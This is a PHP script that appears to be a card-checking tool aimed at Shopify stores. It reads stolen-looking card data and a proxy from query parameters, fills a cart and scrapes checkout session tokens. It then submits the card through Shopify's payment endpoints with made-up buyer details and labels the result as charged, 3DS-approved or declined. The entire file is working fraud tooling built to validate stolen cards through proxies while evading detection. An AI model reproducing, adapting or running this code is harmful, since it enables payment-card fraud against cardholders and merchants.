<?php
header('Content-Type: application/json');
$cc = $_GET['cc']??''; $site = $_GET['site']??''; $proxy = $_GET['proxy']??'';
if(!$cc||!$site||!$proxy){echo json_encode(["Response"=>"ERROR"]);exit;}
$p = explode('|',$cc); if(count($p)!=4){echo json_encode(["Response"=>"ERROR"]);exit;}
$cc=$p[0]; $mon=$p[1]; $yr=$p[2]; $cvv=$p[3];
$pp = explode(':',$proxy); $px = count($pp)>=4?"http://{$pp[2]}:{$pp[3]}@{$pp[0]}:{$pp[1]}":"http://$proxy";
$site = rtrim($site,'/');
function ua(){return ['Mozilla/5.0 Chrome/120','Mozilla/5.0 Firefox/121'][array_rand(['a','b'])];}
function info(){
$fn=["John","Emily"]; $ln=["Smith","Johnson"]; $ad=["123 Main St"];
return ["fn"=>$fn[array_rand($fn)],"ln"=>$ln[array_rand($ln)],"em"=>"t".rand(1,999)."@g.com","ph"=>"2025550199","ad"=>$ad[0],"ct"=>"Portland","st"=>"ME","zp"=>"04101"];
}
function fb($s,$a,$b){$p=strpos($s,$a);if($p===false)return"";$p+=strlen($a);$e=strpos($s,$b,$p);return $e===false?"":substr($s,$p,$e-$p);}
function rc($u,$m="GET",$d=null,$h=[],$p=null){
$c=curl_init();curl_setopt($c,60,0);curl_setopt($c,52,1);curl_setopt($c,19963,1);curl_setopt($c,13,60);curl_setopt($c,64,0);if($p){curl_setopt($c,10004,$p);}
if($m=="POST"){curl_setopt($c,47,1);if($d)curl_setopt($c,10015,$d);}if($h)curl_setopt($c,10023,$h);curl_setopt($c,10002,$u);$r=curl_exec($c);$cd=curl_getinfo($c,15);curl_close($c);return["b"=>$r,"c"=>$cd];}
$r=["Response"=>"ERROR","Price"=>"0.00"]; try{
$ua=ua(); $h=["User-Agent: $ua"];
$q=$site."/products.json"; $x=rc($q,"GET",null,$h,$px); if($x['c']!=200){echo json_encode($r);exit;}
$j=json_decode($x['b'],1); $vd=$j['products'][0]['variants'][0]; $vid=$vd['id']; $r["Price"]=$vd['price'];
$ua=ua(); $h=["User-Agent: $ua"]; rc($site."/cart.js","GET",null,$h,$px);
$pd="id=$vid&quantity=1&form_type=product"; $h[]="Content-Type:application/x-www-form-urlencoded"; $x=rc($site."/cart/add.js","POST",$pd,$h,$px); if($x['c']!=200){echo json_encode($r);exit;}
$x=rc($site."/cart.js","GET",null,$h,$px); $tk=json_decode($x['b'],1)['token'];
$h=["User-Agent:$ua","Origin:$site","Referer:$site/cart"]; rc($site."/checkout","GET",null,$h,$px);
$x=rc($site."/cart","POST","checkout=&updates[]=1",$h,$px); $txt=$x['b'];
preg_match('/name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"/',$txt,$m); $st=$m[1]??null;
$qt=fb($txt,'queueToken&quot;:&quot;','&quot;'); $sid=fb($txt,'stableId&quot;:&quot;','&quot;'); $pmi=fb($txt,'paymentMethodIdentifier&quot;:&quot;','&quot;');
if(!$st||!$qt||!$sid||!$pmi){$r["Response"]="ERROR_TOKENS";echo json_encode($r);exit;}
sleep(1); $in=info(); $dom=parse_url($site,3); $sid2=null;
foreach(["https://deposit.us.shopifycs.com/sessions","https://checkout.pci.shopifyinc.com/sessions"] as$e){
$jd=json_encode(["credit_card"=>["number"=>$cc,"month"=>$mon,"year"=>$yr,"verification_value"=>$cvv,"name"=>$in['fn']." ".$in['ln']],"payment_session_scope"=>$dom]);
$rh=rc($e,"POST",$jd,["Content-Type:application/json","Origin:https://checkout.shopifycs.com","User-Agent:$ua"],$px);
if($rh['c']==200){$d=json_decode($rh['b'],1); if(isset($d['id'])){$sid2=$d['id'];break;}}}
if(!$sid2){$r["Response"]="CARD_DECLINED";echo json_encode($r);exit;}
sleep(1); $gql=$site."/checkouts/unstable/graphql"; $pid=sprintf("%08x-%04x-%04x-%04x-%012x",rand(1e7,1e8),rand(1e3,1e4),rand(1e3,1e4),rand(1e3,1e4),rand(1e11,1e12));
$gh=["Content-Type:application/json","Origin:$site","User-Agent:$ua","x-checkout-one-session-token:$st","x-checkout-web-deploy-stage:production","x-checkout-web-source-id:$tk"];
$q='{"query":"mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...R __typename}__typename}...on SubmitFailed{reason __typename}...on Throttled{pollAfter __typename}}}fragment R on Receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on FailedReceipt{id __typename}}","variables":{"input":{"sessionInput":{"sessionToken":"'.$st.'"},"queueToken":"'.$qt.'","discounts":{"lines":[]},"delivery":{"deliveryLines":[{"destination":{"streetAddress":{"address1":"'.$in['ad'].'","city":"'.$in['ct'].'","countryCode":"US","postalCode":"'.$in['zp'].'","firstName":"'.$in['fn'].'","lastName":"'.$in['ln'].'","zoneCode":"'.$in['st'].'","phone":"'.$in['ph'].'}},"deliveryMethodTypes":["SHIPPING"],"expectedTotalPrice":{"any":true}}]},"merchandise":{"merchandiseLines":[{"stableId":"'.$sid.'","merchandise":{"productVariantReference":{"id":"gid://shopify/ProductVariantMerchandise/'.$vid.'","variantId":"gid://shopify/ProductVariant/'.$vid.'"}},"quantity":{"items":{"value":1}},"expectedTotalPrice":{"any":true}}]},"payment":{"totalAmount":{"any":true},"paymentLines":[{"paymentMethod":{"directPaymentMethod":{"paymentMethodIdentifier":"'.$pmi.'","sessionId":"'.$sid2.'","billingAddress":{"streetAddress":{"address1":"'.$in['ad'].'","city":"'.$in['ct'].'","countryCode":"US","postalCode":"'.$in['zp'].'","firstName":"'.$in['fn'].'","lastName":"'.$in['ln'].'","zoneCode":"'.$in['st'].'","phone":"'.$in['ph'].'}}}},"amount":{"any":true}}]}},"buyerIdentity":{"buyerIdentity":{"presentmentCurrency":"USD","countryCode":"US"},"contactInfoV2":{"emailOrSms":{"value":"'.$in['em'].'"}}}},"tip":{"tipLines":[]},"taxes":{"proposedTotalAmount":{"value":{"amount":"0","currencyCode":"USD"}}},"note":{},"scriptFingerprint":{}},"attemptToken":"'.$tk.'-'.mt_rand().'","metafields":[]},"operationName":"SubmitForCompletion"}';
$x=rc($gql,"POST",$q,$gh,$px);
if($x['c']==200){$jd=json_decode($x['b'],1); $c=$jd['data']['submitForCompletion']??[];
if(isset($c['receipt']['id'])){$rid=$c['receipt']['id'];for($i=0;$i<10;$i++){sleep(3);$pq='{"query":"query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...R __typename}}fragment R on Receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on FailedReceipt{id __typename}}","variables":{"receiptId":"'.$rid.'","sessionToken":"'.$st.'"},"operationName":"PollForReceipt"}';$pr=rc($gql,"POST",$pq,$gh,$px);if($pr['c']==200){$rd=json_decode($pr['b'],1);$rcp=$rd['data']['receipt']??[];$tn=$rcp['__typename']??'';if($tn==='ProcessedReceipt'){$r["Response"]="CARD_CHARGED";echo json_encode($r);exit;}if($tn==='ActionRequiredReceipt'){$r["Response"]="APPROVED_3DS";echo json_encode($r);exit;}if($tn==='FailedReceipt'){$r["Response"]="CARD_DECLINED";echo json_encode($r);exit;}}}}
if(($c['__typename']??'')==='Throttled'){$r["Response"]="PENDING";echo json_encode($r);exit;}if(!empty($c['reason'])){$r["Response"]="CARD_DECLINED";echo json_encode($r);exit;}}echo json_encode($r);}catch(Exception$e){echo json_encode(["Response"=>"ERROR"]);}
